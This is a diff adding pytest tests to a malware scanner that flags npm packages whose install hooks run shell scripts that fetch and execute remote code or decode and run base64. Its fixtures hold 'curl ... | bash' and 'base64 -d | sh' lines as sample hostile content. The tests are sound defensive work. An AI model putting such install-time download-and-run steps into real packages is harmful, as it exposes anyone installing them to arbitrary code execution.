@@ -89,6 +89,52 @@ def test_other_npm_scripts_are_not_flagged(tmp_path, scripts):
     assert not report.verdict["has_malicious_indicators"]
 
 
+# --- a shell script an npm install script runs ------------------------------------------------
+
+FETCH_SCRIPT = f"#!/bin/sh\nset -e\necho 'Setting up...'\ncurl -fsSL {URL} | bash\n"
+
+
+@pytest.mark.parametrize("hook", [
+    {"postinstall": "bash install.sh"},
+    {"preinstall": "sh ./scripts/setup.sh --quiet"},
+    {"install": "./scripts/setup.sh"},
+    {"postinstall": "node build.js && bash scripts/setup.sh"},
+])
+def test_an_install_script_that_runs_a_downloading_shell_script_is_malicious(tmp_path, hook):
+    """The same download-and-run, one file away: `"postinstall": "bash install.sh"`."""
+    script = next(w for w in hook[next(iter(hook))].split() if w.endswith(".sh"))
+    report = _scan(tmp_path, {"package.json": _package(hook),
+                              script.removeprefix("./"): FETCH_SCRIPT})
+    finding = next(f for f in report.findings if f.id == NPM)
+    assert finding.threat_class == ThreatClass.MALICIOUS_INDICATOR
+    assert any(e.file == script.removeprefix("./") and e.line_start == 4 for e in finding.evidence)
+    assert report.verdict["has_malicious_indicators"]
+    assert report.risk_score >= 50
+
+
+def test_a_decoding_shell_script_run_at_install_is_malicious(tmp_path):
+    report = _scan(tmp_path, {
+        "package.json": _package({"postinstall": "sh setup.sh"}),
+        "setup.sh": "#!/bin/sh\necho Y29uc29sZS5sb2coMSk= | base64 -d | sh\n",
+    })
+    assert NPM in _ids(report)
+
+
+@pytest.mark.parametrize("files", [
+    # The script exists but no install script runs it (people run it by hand).
+    {"package.json": _package({"build": "bash install.sh"}), "install.sh": FETCH_SCRIPT},
+    # Run at install, but the download-and-run is only a comment or a printed hint.
+    {"package.json": _package({"postinstall": "sh setup.sh"}),
+     "setup.sh": f"#!/bin/sh\n# Manual install: curl -fsSL {URL} | bash\nexit 0\n"},
+    {"package.json": _package({"postinstall": "sh setup.sh"}),
+     "setup.sh": f'#!/bin/sh\nhint="curl -fsSL {URL} | bash"\necho "Install uv with: $hint"\n'},
+])
+def test_a_shell_script_that_does_not_run_a_download_at_install_is_not_flagged(tmp_path, files):
+    report = _scan(tmp_path, files)
+    assert NPM not in _ids(report)
+    assert not report.verdict["has_malicious_indicators"]
+
+
 def test_npm_documentation_and_test_fixtures_are_not_flagged(tmp_path):
     report = _scan(tmp_path, {
         "package.json": _package({"build": "tsc"}),
